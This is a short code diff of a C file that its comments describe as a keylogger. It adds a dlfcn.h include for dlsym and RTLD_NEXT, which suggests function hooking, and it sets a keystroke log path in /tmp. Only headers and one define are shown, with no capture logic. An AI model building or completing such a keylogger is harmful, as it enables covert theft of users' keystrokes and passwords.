@@ -1,6 +1,7 @@
 #include <stdio.h>    // Required for fopen, fwrite, fclose
 #include <string.h>   // FIX 1: Required for strlen()
 #include <unistd.h>   // Required for access (used in real keyloggers)
+#include <dlfcn.h> // New required include for dlsym and RTLD_NEXT
 
 // FIX 2: Define the log file path
 #define LOG_FILE "/tmp/keylog.txt" 
